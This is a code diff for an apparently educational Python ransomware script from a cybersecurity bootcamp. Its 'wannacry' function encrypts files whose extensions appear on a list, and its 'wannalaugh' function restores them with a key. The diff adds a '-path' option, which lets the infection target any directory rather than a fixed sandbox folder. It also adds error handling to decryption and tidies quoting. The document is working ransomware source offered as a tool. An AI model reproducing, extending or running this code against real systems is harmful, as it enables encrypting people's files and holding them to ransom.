@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-__author__ = "rikrdo"
-__copyright__ = "Copyright 2022, Bootcamp Cybersec "
-__credits__ = ["rikrdo"]
-__license__ = "GPL"
-__version__ = "1.0.1"
-__maintainer__ = "rikrdo"
-__email__ = "rikrdo@rikrdo.es"
-__status__ = "Production"
+__author__ = 'rikrdo'
+__copyright__ = 'Copyright 2022, Bootcamp Cybersec '
+__credits__ = ['rikrdo']
+__license__ = 'GPL'
+__version__ = '1.0.1'
+__maintainer__ = 'rikrdo'
+__email__ = 'rikrdo@rikrdo.es'
+__status__ = 'Production'
 
 import os, sys, argparse
 from time import sleep
@@ -40,22 +40,24 @@ def encrypt(file):
         
 # decrypt files
 def decrypt(file, key):
-    fernet = Fernet(key)
+    try:
+        fernet = Fernet(key)
 
-    with open(file, 'rb') as enc_file:
-        encrypted = enc_file.read()
+        with open(file, 'rb') as enc_file:
+            encrypted = enc_file.read()
 
-    decrypted = fernet.decrypt(encrypted)
+        decrypted = fernet.decrypt(encrypted)
 
-    with open(file, 'wb') as dec_file:
-        dec_file.write(decrypted)
-    
-    decrypt_file = file[:-3]
-    os.rename(file, decrypt_file)
-
+        with open(file, 'wb') as dec_file:
+            dec_file.write(decrypted)
+        
+        decrypt_file = file[:-3]
+        os.rename(file, decrypt_file)
+    except:
+        print('\033[91m\t[', file, '] Is not a encrypted file \u2716\033[0m')
 # get file extension
 def get_file_ext(file):
-    ext = file.split(".")
+    ext = file.split('.')
     if len(ext) > 1:
         ext = ext[-1]
         return(ext)
@@ -63,54 +65,48 @@ def get_file_ext(file):
         return('')
 
 # infection logic
-def wannacry(silent):
-    path = './infection/'
+def wannacry(silent, path):
     files = os.listdir(path)
-    ext_list = open("wannacry_ext_list.txt").read().splitlines()
+    ext_list = open('wannacry_ext_list.txt').read().splitlines()
     os.chdir(path)
     
-    print('\033[91m\n--------------------------------\n\n   @@@ Infection Started! @@@\n\n--------------------------------\033[0m\n')
-
     if silent == True:
         disable_print()
     else:
         enable_print()
+        
+    print('\033[91m\n--------------------------------\n\n   @@@ Infection Started! @@@\n\n--------------------------------\033[0m\n')
 
     for file in files:
         ext = get_file_ext(file)
         if ext in ext_list: 
-            print("[", ext, "] ", file)
+            print('[', ext, '] ', file, '\033[92m\u2714\033[0m')
             file = encrypt(file)
             sleep(.2)
         else:
             continue
 
 # deinfection logic
-def wannalaugh(key, silent):
-    path = './infection/'
+def wannalaugh(key, silent, path):
     files = os.listdir(path)
     ext_list = ['ft']
     os.chdir(path)
-    
-    print('\033[91m\n--------------------------------\n\n   @@@ Vaccine Unlocked! @@@\n\n--------------------------------\033[0m\n')
-    
+       
     if silent == True:
         disable_print()
     else:
         enable_print()
+        
+    print('\033[91m\n--------------------------------\n\n   @@@ Vaccine Unlocked! @@@\n\n--------------------------------\033[0m\n')
 
     for file in files:
         ext = get_file_ext(file)
         if ext in ext_list: 
-            print("[", ext, "] ", file)
+            print('[', ext, '] ', file, '\033[92m\u2714\033[0m')
             file = decrypt(file, key)
             sleep(.2)
         else:
             continue
-
-# pretty script end after ctrl + c or app ends
-def exit_gracefully():
-    print('\033[91m\n------------------------\n\n   @@@ Bye Bye!!! @@@\n\n------------------------\033[0m'.center(20))
 
 # collect arguments:
 # -silent = silent mode
@@ -121,24 +117,21 @@ def exit_gracefully():
 def main(): 
     parser = argparse.ArgumentParser()
     parser.version = '1.0.1'
-    parser.add_argument('-help', action='help', help="display this help menu")
-    parser.add_argument('-version', action='version', help="display app version")
-    parser.add_argument('-silent', default='False', action='store_true', help="silence stdout")
-    parser.add_argument('-revert', help="with a correct key you can revert the infection")
+    parser.add_argument('-help', action='help', help='display this help menu')
+    parser.add_argument('-version', action='version', help='display app version')
+    parser.add_argument('-silent', default='False', action='store_true', help='silence stdout')
+    parser.add_argument('-revert', help='with a correct key you can revert the infection')
+    parser.add_argument('-path', default = './infection/', help='decide the path to be infected')
     args = parser.parse_args()    
     
     silent = args.silent
+    path = args.path
     
     if args.revert:
         key = args.revert
-        wannalaugh(key, silent)
+        wannalaugh(key, silent, path)
     else:
-        wannacry(silent)
+        wannacry(silent, path)
 
-if __name__=="__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        pass
-    finally:
-        exit_gracefully()
+if __name__=='__main__':
+    main()
